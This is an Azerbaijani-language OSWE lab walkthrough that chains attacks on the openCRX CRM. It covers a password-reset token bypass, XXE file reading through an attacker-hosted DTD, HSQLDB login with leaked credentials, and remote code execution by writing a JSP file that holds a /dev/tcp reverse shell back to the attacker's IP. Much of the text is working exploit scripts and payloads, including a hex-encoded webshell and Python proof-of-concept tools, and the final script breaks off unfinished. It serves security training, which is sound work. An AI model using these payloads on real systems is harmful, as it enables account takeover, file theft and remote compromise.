OpenCRX Tam İstismar Bələdçisi - OSWE Hazırlıq
Mündəricat

Modulun Ümumi Baxışı
Laboratoriya Mühitinin Qurulması
Faza 1: Kəşfiyyat
Faza 2: Parol Sıfırlama Zəifliyi
Faza 3: XXE İstismarı
Faza 4: HSQLDB Girişi
Faza 5: Java Dil Rutinləri vasitəsilə RCE
POC Skriptlər


Modulun Ümumi Baxışı
Hədəf Tətbiq: openCRX CRM Sistemi
Texnologiyalar: Java, Apache TomEE, HSQLDB
Hücum Səthləri: Parol sıfırlama, XXE, Verilənlər bazası girişi, Fayl yazma
Son Məqsəd: Uzaqdan Kod İcrası
Zəiflik Zənciri:
Parol Sıfırlama Bypass → Təsdiqlənmiş Giriş → XXE → Baza Məlumatları → Fayl Yazma → RCE

Laboratoriya Mühitinin Qurulması
Hədəf Məlumatları
Host adı: opencrx
IP Ünvanı: 192.168.121.126
Veb Port: 8080
Verilənlər Bazası Portu: 9001

Standart Etimadnamələr:
- guest / guest
- admin-Standard / admin-Standard
- admin-Root / admin-Root

SSH Girişi:
İstifadəçi: student
Parol: studentlab
Hücumçu Maşın
ƏS: Kali Linux
IP: 192.168.45.237
Lazımi Alətlər:
- Python 3
- Java JDK
- JD-GUI
- Burp Suite
- netcat
Asılılıqları Quraşdırın
bash# Sistemi yeniləyin
sudo apt update

# Java quraşdırın
sudo apt install -y openjdk-11-jdk

# Dekompiler quraşdırın
sudo apt install -y jd-gui

# Python kitabxanaları
pip3 install requests beautifulsoup4 lxml click pexpect

# Digər alətlər
sudo apt install -y burpsuite nmap netcat-traditional
/etc/hosts Konfiqurasiyası
bashecho "192.168.121.126  opencrx" | sudo tee -a /etc/hosts

Faza 1: Kəşfiyyat
1.1 Tətbiq Strukturunun Kəşfi
SSH vasitəsilə hədəfə qoşulun:
bashssh student@opencrx
# Parol: studentlab
Tətbiq qovluğuna keçin:
bashcd ~/crx/apache-tomee-plus-7.0.5/apps/
ls -la
```

**Gözlənilən nəticə:**
```
opencrx-core-CRX/       # Yerləşdirilmiş tətbiq
opencrx-core-CRX.ear    # Orijinal paket
```

**Tətbiq strukturu:**
```
apache-tomee-plus-7.0.5/
├── apps/
│   └── opencrx-core-CRX/
│       ├── opencrx-core-CRX.war     # Əsas veb tətbiq
│       ├── opencrx-rest-CRX.war     # REST API
│       ├── APP-INF/lib/             # Paylaşılan kitabxanalar
│       │   └── opencrx-kernel.jar   # Əsas məntiq
│       └── META-INF/
│           └── application.xml       # Yerləşdirmə konfiqurasiyası
├── conf/
│   └── tomcat-users.xml             # İstifadəçi etimadnamələri
└── data/
    └── hsqldb/                       # Verilənlər bazası faylları
1.2 Tətbiq Fayllarını Kopyalayın
SSH-dən çıxın və EAR faylını Kali-yə kopyalayın:
bashexit
scp student@opencrx:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
EAR faylını açın:
bashmkdir opencrx
unzip -q opencrx-core-CRX.ear -d opencrx/
cd opencrx/
ls -la
1.3 JD-GUI ilə Təhlil Edin
Əsas WAR faylını açın:
bashjd-gui opencrx-core-CRX.war &
Yoxlanılacaq əsas fayllar:

RequestPasswordReset.jsp - Parol sıfırlama sorğusu işləyicisi
PasswordResetConfirm.jsp - Parol sıfırlama təsdiqi
WEB-INF/web.xml - Servlet əlaqələndirmələri

Paylaşılan kitabxananı açın:
bashjd-gui APP-INF/lib/opencrx-kernel.jar &
Vacib siniflər:

org.opencrx.kernel.utils.Utils - Faydalı funksiyalar
org.opencrx.kernel.backend.UserHomes - İstifadəçi idarəetməsi
org.opencrx.kernel.home1.aop2.UserHomeImpl - Tətbiqetmə


Faza 2: Parol Sıfırlama Zəifliyi
2.1 Kod Təhlili
RequestPasswordReset.jsp (Sətir 153-175):
jspif(principalName != null && providerName != null && segmentName != null) {
    org.opencrx.kernel.home1.jmi1.UserHome userHome = 
        (org.opencrx.kernel.home1.jmi1.UserHome)pm.getObjectById(...);
    
    pm.currentTransaction().begin();
    userHome.requestPasswordReset();
    pm.currentTransaction().commit();
}
UserHomes.java (Sətir 324-365):
javapublic void requestPasswordReset(UserHome userHome) {
    String resetToken = Utils.getRandomBase62(40);
    
    String resetConfirmUrl = webAccessUrl + 
        "/PasswordResetConfirm.jsp?t=" + resetToken + 
        "&p=" + providerName + 
        "&s=" + segmentName + 
        "&id=" + principalName;
    
    changePassword(..., "{RESET}" + resetToken);
}
Utils.java (Sətir 1038-1046) - Zəiflik:
javapublic static String getRandomBase62(int length) {
    String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    Random random = new Random(System.currentTimeMillis());  // ZƏİF!
    String s = "";
    for (int i = 0; i < length; i++) {
        s = s + alphabet.charAt(random.nextInt(62));
    }
    return s;
}
Problem: java.security.SecureRandom əvəzinə proqnozlaşdırıla bilən seed ilə java.util.Random istifadə edir
2.2 Token Bypass Kəşfi
PasswordResetConfirm.jsp (Sətir 67-72):
jspString resetToken = request.getParameter("t");
String providerName = request.getParameter("p");
String segmentName = request.getParameter("s");
String id = request.getParameter("id");
String password1 = request.getParameter("password1");
String password2 = request.getParameter("password2");
Burp Suite ilə test:
httpPOST /opencrx-core-CRX/PasswordResetConfirm.jsp HTTP/1.1
Host: 192.168.121.126:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

t=f&p=CRX&s=Standard&id=admin-Standard&password1=password&password2=password
Cavab:
htmlPassword successfully changed
Əsas səbəb: Token yoxlama məntiqi 'f' dəyərini etibarlı token kimi qəbul edir (çox güman ki istehsalda qalan test/debug kodu)
2.3 POC - Parol Sıfırlama
Bax: POC #1 - Parol Sıfırlama

Faza 3: XXE İstismarı
3.1 XML Xarici Obyekt Əsasları
Daxili obyektli XML:
xml<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY company "Offensive Security">
]>
<message>
    <text>&company; OSWE</text>
</message>
Təhlil edilmiş nəticə:
xml<message>
    <text>Offensive Security OSWE</text>
</message>
Xarici obyektli XML (fayl oxuma):
xml<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY external SYSTEM "file:///etc/passwd">
]>
<data>
    <content>&external;</content>
</data>
```

### 3.2 XXE Son Nöqtəsinin Tapılması

**Tətbiqə daxil olun:**
```
URL: http://192.168.121.126:8080/opencrx-core-CRX/
İstifadəçi: admin-Standard
Parol: password (sıfırlamadan sonra)
```

**API Explorer-ə keçin:**
```
Menyu → Sehirbazlar → API-ni Araşdır...
```

**Swagger UI açılır:**
```
http://192.168.121.126:8080/opencrx-core-CRX/swagger-ui/
```

**Hədəf son nöqtə:**
```
POST /org.opencrx.kernel.account1/provider/CRX/segment/Standard/account
Content-Type: application/xml
3.3 XXE Testi
Əsas sorğu:
xml<?xml version="1.0"?>
<org.opencrx.kernel.account1.Contact>
  <lastName>Test</lastName>
  <firstName>User</firstName>
</org.opencrx.kernel.account1.Contact>
Daxili obyekti test edin:
xml<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY lastname "INJECTED">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
Nəticə: lastName sahəsi "INJECTED" məzmunu daşıyır - obyektlər işlənir!
Xarici obyekti test edin:
xml<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
Nəticə: SQL xətası ilə /etc/passwd məzmunu xəta mesajında görünür
3.4 CDATA Paket Texnikası
Problem: Fayl məzmunundakı XML xüsusi simvollar XML təhlilini pozur
Həll: Xarici DTD vasitəsilə CDATA paketi
Hücumçu maşında wrapper.dtd yaradın:
bashsudo nano /var/www/html/wrapper.dtd
Məzmun:
xml<!ENTITY wrapper "%start;%file;%end;">
Apache-ni işə salın:
bashsudo systemctl start apache2
Dəyişdirilmiş XXE yükü:
xml<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.45.237/wrapper.dtd">
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
Nəticə: Fayl məzmunu xəta mesajları vasitəsilə əldə edildi
3.5 Qovluq Siyahısı
Java File sinif davranışı: Qovluq yolunu verdikdə, toString() fayl siyahısını qaytarır
Qovluqları sadalayın:
xml<!ENTITY % file SYSTEM "file:///home/student/crx/">
```

**Nəticə:**
```
apache-tomee-plus-7.0.5
data
Verilənlər bazası qovluğunu yoxlayın:
xml<!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/">
```

**Nəticə:**
```
dbmanager.sh
CRX.properties
CRX.script
3.6 Verilənlər Bazası Etimadnamələrini Çıxarın
dbmanager.sh-ı oxuyun:
xml<!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/dbmanager.sh">
Çıxarılan məzmun:
bash#!/bin/sh
java -cp /path/to/hsqldb.jar org.hsqldb.util.DatabaseManager \
  --url jdbc:hsqldb:hsql://127.0.0.1:9001/CRX \
  --user sa \
  --password manager99
```

**Tapılan etimadnamələr:**
```
JDBC URL: jdbc:hsqldb:hsql://127.0.0.1:9001/CRX
İstifadəçi adı: sa
Parol: manager99
Port: 9001
3.7 POC - XXE İstismarı
Bax: POC #2 - XXE Fayl Oxuma

Faza 4: HSQLDB Girişi
4.1 Port Yoxlaması
bashnmap -p 9001 192.168.121.126 -sV
```

**Nəticə:**
```
PORT     STATE SERVICE
9001/tcp open  hsqldb
4.2 HSQLDB Klienti Yükləyin
bashcd ~/oswe

# HSQLDB yükləyin
wget https://repo1.maven.org/maven2/org/hsqldb/hsqldb/2.7.1/hsqldb-2.7.1.jar -O hsqldb.jar

# SqlTool yükləyin
wget https://repo1.maven.org/maven2/org/hsqldb/sqltool/2.7.1/sqltool-2.7.1.jar -O sqltool.jar

# Yoxlayın
ls -lh *.jar
4.3 Bağlantını Konfiqurasiya Edin
sqltool.rc yaradın:
bashcat > sqltool.rc << 'EOF'
urlid crx
url jdbc:hsqldb:hsql://192.168.121.126:9001/CRX
username sa
password manager99
EOF
4.4 Verilənlər Bazasına Qoşulun
bashjava -cp hsqldb.jar:sqltool.jar \
     org.hsqldb.cmdline.SqlTool \
     --rcFile=sqltool.rc \
     crx
```

**Gözlənilən nəticə:**
```
SqlTool v. 2.7.1
sql>
4.5 Verilənlər Bazasını Sadalayın
Cədvəlləri sadalayın:
sqlSELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_SCHEMA='PUBLIC';
Cari istifadəçini yoxlayın:
sqlSELECT USER() FROM (VALUES(0));
Classpath-ı yoxlayın:
sql-- Test funksiyası yaradın
CREATE FUNCTION getProperty(IN key VARCHAR) 
RETURNS VARCHAR 
LANGUAGE JAVA 
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty';

-- Onu çağırın
VALUES getProperty('java.class.path');
```

**Nəticə:**
```
/home/student/crx/apache-tomee-plus-7.0.5/lib/hsqldb.jar
Mövcud siniflər:

hsqldb.jar sinifləri
Java standart kitabxanası (rt.jar)

4.6 POC - HSQLDB Bağlantısı
Bax: POC #3 - HSQLDB Bağlantısı

Faza 5: Java Dil Rutinləri vasitəsilə RCE
5.1 Java Dil Rutinləri (JRT)
HSQLDB JRT qabiliyyəti: SQL-dən statik Java metodlarını çağırın
Tələblər:

Metod statik olmalıdır
Metod classpath-da olmalıdır
Parametr/qaytarma tipləri SQL tiplərinə uyğun olmalıdır

Tip əlaqələndirməsi:
SQL TipiJava TipiVARCHARStringINTEGERintVARBINARYbyte[]
5.2 Uyğun Metod Tapın
Java standart kitabxanasında (rt.jar) axtarın:
Mənbələri çıxarın:
bashjd-gui /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar
# Fayl → Bütün Mənbələri Saxla
VS Code-da açın və axtarın:
regexpublic static void \w+\(String.*byte\[\]
```

**Tapılan metod:**
```
com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename
Metod imzası:
javapublic static void writeBytesToFilename(
    String filename,
    byte[] bytes
)
Mənbə kodu (JavaUtils.java):
javapublic static void writeBytesToFilename(String filename, byte[] bytes) {
    FileOutputStream fos = null;
    try {
        if (filename != null && bytes != null) {
            File file = new File(filename);  // Yol yoxlaması yoxdur!
            fos = new FileOutputStream(file);
            fos.write(bytes);
            fos.close();
        }
    } catch (IOException ex) {
        // idarə et
    }
}
İstismar üçün mükəmməl:

Statik metod
Classpath-da (rt.jar)
String + byte[] qəbul edir
Yol yoxlaması yoxdur (yol keçidi mümkündür)

5.3 SQL Proseduru Yaradın
sqlCREATE PROCEDURE writeBytesToFilename(
    IN paramString VARCHAR, 
    IN paramArrayOfByte VARBINARY(1024)
) 
LANGUAGE JAVA 
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename';
5.4 Fayl Yazmanı Test Edin
POC test:
sql-- "Hello World!" hex formatında
CALL writeBytesToFilename(
    'test.txt',
    CAST('48656c6c6f20576f726c6421' AS VARBINARY(1024))
);
Yoxlayın (işçi qovluğu yoxlayın):
sqlVALUES getProperty('user.dir');
-- Nəticə: /home/student/crx/data/hsqldb
Faylın mövcudluğunu yoxlayın (XXE və ya SSH vasitəsilə):
bashssh student@opencrx
cat ~/crx/data/hsqldb/test.txt
# Nəticə: Hello World!
5.5 Webroot Yolunu Müəyyən Edin
Metod 1 - SSH:
bashssh student@opencrx
cd ~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/
ls
```

**Nəticə:**
```
opencrx-core-CRX/       # Bu webroot-dur
opencrx-core-CRX.war
```

**Webroot yolu:**
```
/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/
Metod 2 - XXE qovluq siyahısı:
xml<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/">
```

**URL əlaqələndirməsi:**
```
http://192.168.121.126:8080/opencrx-core-CRX/shell.jsp
→
/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell.jsp
```

### 5.6 Yol Keçidi

**Cari qovluq:** `/home/student/crx/data/hsqldb/`  
**Hədəf qovluq:** `/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/`

**Nisbi yol:**
```
../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell.jsp
5.7 JSP Reverse Shell
JSP yükü:
jsp<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    try {
        Process p = Runtime.getRuntime().exec(
            new String[]{"/bin/bash", "-c", 
            "bash -i >& /dev/tcp/192.168.45.237/443 0>&1"}
        );
        p.waitFor();
    } catch(Exception e) {}
}
%>
Hex-ə çevirin:
pythonjsp = '''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    try {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.45.237/443 0>&1"});
        p.waitFor();
    } catch(Exception e) {}
}
%>'''

print(jsp.encode().hex())
5.8 Yükləyin və Tetikləyin
Dinləyici başladın:
bashnc -lvnp 443
Webshell-i HSQLDB vasitəsilə yükləyin:
sqlCALL writeBytesToFilename(
    '../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell13.jsp',
    CAST('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a696628636d6420213d206e756c6c29207b0a747279207b0a50726f636573732070203d2052756e74696d652e67657452756e74696d6528292e65786563286e657720537472696e675b5d7b222f62696e2f62617368222c20222d63222c202262617368202d69203e26202f6465762f7463702f3139322e3136382e34352e3233372f34343320303e263122207d293b0a702e77616974466f7228293b0a7d20636174636828457863657074696f6e206529207b7d0a7d0a253e' AS VARBINARY(1024))
);
Shell-i tetikləyin:
bashcurl http://192.168.121.126:8080/opencrx-core-CRX/shell13.jsp?cmd=id
```

**Dinləyici bağlantı qəbul edir:**
```
connect to [192.168.45.237] from [192.168.121.126]
bash: cannot set terminal process group: Inappropriate ioctl
student@opencrx:/home/student/crx/...$
Shell təkmilləşdirməsi:
bashpython3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
5.9 POC - Tam RCE
Bax: POC #4 - HSQLDB vasitəsilə RCE

POC Skriptlər
POC #1 - Parol Sıfırlama
Fayl: poc1_parol_sifirlama.py
python#!/usr/bin/env python3
"""
OpenCRX Parol Sıfırlama Bypass
İstifadə: python3 poc1_parol_sifirlama.py -t <hedef_url> -u <istifadeci_adi> -p <yeni_parol>
"""
import argparse
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def parolu_sifirla(hedef_url, istifadeci_adi, yeni_parol):
    """
    Parol sıfırlama bypass zəifliyini istismar et
    CVE tipli: Token yoxlama 'f' dəyərini etibarlı token kimi qəbul edir
    """
    print(f"[*] Hədəf: {hedef_url}")
    print(f"[*] İstifadəçi adı: {istifadeci_adi}")
    print(f"[*] Yeni parol: {yeni_parol}")
    
    # Sıfırlama URL-ini qur
    if not hedef_url.endswith('/'):
        hedef_url += '/'
    
    sifirlama_url = f"{hedef_url}PasswordResetConfirm.jsp"
    
    # Yükü hazırla
    # Token bypass: t=f yoxlamada məntiq xətasına görə işləyir
    data = {
        't': 'f',              # Token (bypass dəyəri)
        'p': 'CRX',            # Provayder adı
        's': 'Standard',       # Seqment adı
        'id': istifadeci_adi,  # Hədəf istifadəçi adı
        'password1': yeni_parol,
        'password2': yeni_parol
    }
    
    print(f"\n[*] Sıfırlama sorğusu göndərilir: {sifirlama_url}")
    
    try:
        cavab = requests.post(
            sifirlama_url,
            data=data,
            verify=False,
            timeout=10
        )
        
        if "Password successfully changed" in cavab.text:
            print("[+] UĞURLU! Parol sıfırlaması tamamlandı")
            print(f"[+] Yeni etimadnamələr: {istifadeci_adi}:{yeni_parol}")
            return True
        else:
            print("[-] UĞURSUZ! Parol sıfırlaması alınmadı")
            print(f"[-] Cavab: {cavab.text[:200]}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] XƏTA: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description='OpenCRX Parol Sıfırlama Bypass',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Nümunələr:
  python3 poc1_parol_sifirlama.py -t http://192.168.121.126:8080/opencrx-core-CRX -u admin-Standard -p password
  python3 poc1_parol_sifirlama.py -t http://hedef:8080/opencrx-core-CRX -u guest -p yeniparol123
        """
    )
    
    parser.add_argument('-t', '--target', required=True, 
                       help='Hədəf URL (məsələn: http://192.168.121.126:8080/opencrx-core-CRX)')
    parser.add_argument('-u', '--username', required=True,
                       help='Sıfırlanacaq istifadəçi adı (məsələn: admin-Standard)')
    parser.add_argument('-p', '--password', required=True,
                       help='Təyin ediləcək yeni parol')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("OpenCRX Parol Sıfırlama Bypass İstismarı")
    print("=" * 60)
    
    ugur = parolu_sifirla(args.target, args.username, args.password)
    
    if ugur:
        print("\n[*] Növbəti addımlar:")
        print(f"    1. Daxil olun: {args.target}")
        print(f"    2. Etimadnamələrdən istifadə edin: {args.username}:{args.password}")
    else:
        print("\n[!] İstismar uğursuz oldu. Hədəfi yoxlayın və yenidən cəhd edin.")

if __name__ == "__main__":
    main()
İstifadə:
bashpython3 poc1_parol_sifirlama.py -t http://192.168.121.126:8080/opencrx-core-CRX \
                                 -u admin-Standard \
                                 -p password

POC #2 - XXE Fayl Oxuma
Fayl: poc2_xxe_fayl_oxuma.py
python#!/usr/bin/env python3
"""
OpenCRX XXE Fayl Oxuma İstismarı
İstifadə: python3 poc2_xxe_fayl_oxuma.py -t <hedef_url> -u <istifadeci> -p <parol> -f <oxunacaq_fayl>
"""
import argparse
import requests
import base64
import re
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def dtd_server_qur(hucumcu_ip):
    """
    DTD serverin qurulması üçün təlimatlar
    """
    print(f"\n[!] QURAŞDIRMA LAZIMDIR: DTD Server")
    print(f"[*] Sizin Kali maşınızda ({hucumcu_ip}):")
    print(f"    1. /var/www/html/wrapper.dtd faylını məzmunla yaradın:")
    print(f'       <!ENTITY wrapper "%start;%file;%end;">')
    print(f"    2. Apache-ni başladın: sudo systemctl start apache2")
    print(f"    3. Yoxlayın: curl http://{hucumcu_ip}/wrapper.dtd")
    
    input("\n[*] Quraşdırmanı tamamladıqdan sonra Enter basın...")

def xxe_fayl_oxu(hedef_url, istifadeci, parol, fayl_yolu, hucumcu_ip):
    """
    İstənilən faylları oxumaq üçün XXE zəifliyini istismar et
    Xüsusi simvolları idarə etmək üçün CDATA paket texnikası istifadə edir
    """
    print(f"\n[*] Hədəf: {hedef_url}")
    print(f"[*] Oxunacaq fayl: {fayl_yolu}")
    print(f"[*] Hücumçu IP: {hucumcu_ip}")
    
    # API son nöqtəsini qur
    if not hedef_url.endswith('/'):
        hedef_url += '/'
    
    api_url = f"{hedef_url}org.opencrx.kernel.account1/provider/CRX/segment/Standard/account"
    
    # Təsdiqləmə başlığını yarat
    auth_string = f"{istifadeci}:{parol}"
    auth_bytes = auth_string.encode('utf-8')
    auth_b64 = base64.b64encode(auth_bytes).decode('utf-8')
    
    headers = {
        'Authorization': f'Basic {auth_b64}',
        'Content-Type': 'application/xml'
    }
    
    # CDATA paketli XXE yükü
    # Obyekt istinad məhdudiyyətlərini keçmək üçün xarici DTD istifadə edir
    xxe_yuku = f'''<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file://{fayl_yolu}">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://{hucumcu_ip}/wrapper.dtd">
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>XXE</firstName>
</org.opencrx.kernel.account1.Contact>'''
    
    print(f"\n[*] XXE yükü göndərilir...")
    
    try:
        cavab = requests.post(
            api_url,
            headers=headers,
            data=xxe_yuku,
            verify=False,
            timeout=10
        )
        
        # Fayl məzmunu xəta mesajında görünür
        # Fayl məzmunu ilə SQL xətası axtar
        if "SQLDataException" in cavab.text or "string data, right truncation" in cavab.text:
            print("[+] XXE tetiklendi! Xəta mesajından fayl məzmunu çıxarılır...")
            
            # SQL dəyərlər massivindən məzmunu çıxar
            # Pattern: "values": "[..., 'FAYL_MEZMUNU_BURDA', ...]"
            match = re.search(r'"values":\s*"\[.*?\'([^\']{50,})\'', cavab.text)
            if match:
                mezmun = match.group(1)
                # Escape ardıcıllıqlarını təmizlə
                mezmun = mezmun.replace('\\n', '\n').replace('\\t', '\t')
                
                print("\n" + "="*60)
                print(f"FAYL MEZMUNU: {fayl_yolu}")
                print("="*60)
                print(mezmun[:1000])  # İlk 1000 simvol
                if len(mezmun) > 1000:
                    print(f"\n[...kəsildi, ümumi uzunluq: {len(mezmun)} simvol]")
                print("="*60)
                return True
            else:
                print("[*] Fayl oxuma uğurlu oldu lakin məzmun çıxarma uğursuz")
                print("[*] Cavabı manual yoxlayın:")
                print(cavab.text[:500])
                return False
        else:
            print("[-] XXE tetiklənməmiş ola bilər")
            print(f"[-] Status kodu: {cavab.status_code}")
            print(f"[-] Cavab: {cavab.text[:200]}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] XƏTA: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description='OpenCRX XXE Fayl Oxuma İstismarı',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Nümunələr:
  # /etc/passwd oxu
  python3 poc2_xxe_fayl_oxuma.py -t http://192.168.121.126:8080/opencrx-core-CRX \\
                                  -u admin-Standard -p password \\
                                  -f /etc/passwd -a 192.168.45.237
  
  # Verilənlər bazası konfiqurasiyasını oxu
  python3 poc2_xxe_fayl_oxuma.py -t http://hedef:8080/opencrx-core-CRX \\
                                  -u admin-Standard -p password \\
                                  -f /home/student/crx/data/hsqldb/dbmanager.sh \\
                                  -a 192.168.45.237
  
  # Qovluq siyahısı
  python3 poc2_xxe_fayl_oxuma.py -t http://hedef:8080/opencrx-core-CRX \\
                                  -u admin-Standard -p password \\
                                  -f /home/student/crx/data/hsqldb/ \\
                                  -a 192.168.45.237
        """
    )
    
    parser.add_argument('-t', '--target', required=True,
                       help='Hədəf URL')
    parser.add_argument('-u', '--username', required=True,
                       help='İstifadəçi adı (parol sıfırlamadan sonra)')
    parser.add_argument('-p', '--password', required=True,
                       help='Parol')
    parser.add_argument('-f', '--file', required=True,
                       help='Oxunacaq fayl yolu (və ya siyahı üçün qovluq)')
    parser.add_argument('-a', '--attacker-ip', required=True,
                       help='DTD server üçün hücumçu IP')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("OpenCRX XXE Fayl Oxuma İstismarı")
    print("=" * 60)
    
    dtd_server_qur(args.attacker_ip)
    
    ugur = xxe_fayl_oxu(
        args.target,
        args.username,
        args.password,
        args.file,
        args.attacker_ip
    )
    
    if ugur:
        print("\n[+] İstismar uğurlu!")
    else:
        print("\n[!] İstismar uğursuz oldu və ya məzmun çıxarma natamam.")

if __name__ == "__main__":
    main()
İstifadə:
bash# Əvvəl DTD serveri qur
echo '<!ENTITY wrapper "%start;%file;%end;">' | sudo tee /var/www/html/wrapper.dtd
sudo systemctl start apache2

# İstismarı işə sal
python3 poc2_xxe_fayl_oxuma.py -t http://192.168.121.126:8080/opencrx-core-CRX \
                                -u admin-Standard \
                                -p password \
                                -f /home/student/crx/data/hsqldb/dbmanager.sh \
                                -a 192.168.45.237

POC #3 - HSQLDB Bağlantısı
Fayl: poc3_hsqldb_baglanti.py
python#!/usr/bin/env python3
"""
OpenCRX HSQLDB Bağlantı və Sadalama
İstifadə: python3 poc3_hsqldb_baglanti.py -t <hedef_ip> -u <baza_istifadeci> -p <baza_parol>
"""
import argparse
import subprocess
import os
import sys
import tempfile
from pathlib import Path

def java_yoxla():
    """Java quraşdırılıb yoxla"""
    try:
        netice = subprocess.run(['java', '-version'], 
                               capture_output=True, 
                               text=True)
        return netice.returncode == 0
    except FileNotFoundError:
        return False

def hsqldb_jar_yukle():
    """HSQLDB JAR faylları mövcud deyilsə yüklə"""
    import urllib.request
    
    jarlar = {
        'hsqldb.jar': 'https://repo1.maven.org/maven2/org/hsqldb/hsqldb/2.7.1/hsqldb-2.7.1.jar',
        'sqltool.jar': 'https://repo1.maven.org/maven2/org/hsqldb/sqltool/2.7.1/sqltool-2.7.1.jar'
    }
    
    for jar_adi, url in jarlar.items():
        if not os.path.exists(jar_adi):
            print(f"[*] {jar_adi} yüklənir...")
            urllib.request.urlretrieve(url, jar_adi)
            print(f"[+] {jar_adi} yükləndi")
        else:
            print(f"[*] {jar_adi} artıq mövcuddur")
    
    return 'hsqldb.jar', 'sqltool.jar'

def rc_fayli_yarat(hedef_ip, istifadeci, parol):
    """Təsdiqləmə üçün SqlTool RC faylı yarat"""
    rc_mezmun = f"""urlid crx
url jdbc:hsqldb:hsql://{hedef_ip}:9001/CRX
username {istifadeci}
password {parol}
"""
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
        f.write(rc_mezmun)
        return f.name

def sql_icra_et(hedef_ip, istifadeci, parol, sql_emrleri, hsqldb_jar, sqltool_jar):
    """HSQLDB-də SQL əmrlərini icra et"""
    rc_fayl = rc_fayli_yarat(hedef_ip, istifadeci, parol)
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.sql', delete=False) as f:
        f.write(sql_emrleri)
        sql_fayl = f.name
    
    try:
        emr = [
            'java', '-cp', f'{hsqldb_jar}:{sqltool_jar}',
            'org.hsqldb.cmdline.SqlTool',
            '--rcFile', rc_fayl,
            'crx',
            sql_fayl
        ]
        
        netice = subprocess.run(emr, capture_output=True, text=True, timeout=30)
        
        # Təmizlə
        os.unlink(rc_fayl)
        os.unlink(sql_fayl)
        
        return netice.stdout, netice.stderr, netice.returncode == 0
        
    except Exception as e:
        if os.path.exists(rc_fayl):
            os.unlink(rc_fayl)
        if os.path.exists(sql_fayl):
            os.unlink(sql_fayl)
        raise e

def bazani_sadala(hedef_ip, istifadeci, parol):
    """Verilənlər bazası strukturunu və qabiliyyətləri sadalayın"""
    print(f"\n[*] {hedef_ip}:9001 ünvanında HSQLDB-yə qoşulur")
    print(f"[*] İstifadəçi: {istifadeci}")
    
    # Lazım olduqda JAR-ları yüklə
    hsqldb_jar, sqltool_jar = hsqldb_jar_yukle()
    
    # Bağlantını test et
    print("\n[*] Bağlantı test edilir...")
    sql = "SELECT USER() FROM (VALUES(0));"
    
    try:
        stdout, stderr, ugur = sql_icra_et(
            hedef_ip, istifadeci, parol, sql, hsqldb_jar, sqltool_jar
        )
        
        if ugur:
            print("[+] Bağlantı uğurlu!")
            print(f"[+] Cari istifadəçi: {istifadeci}")
        else:
            print("[-] Bağlantı uğursuz!")
            print(f"Xəta: {stderr}")
            return False
    except Exception as e:
        print(f"[-] Bağlantı xətası: {e}")
        return False
    
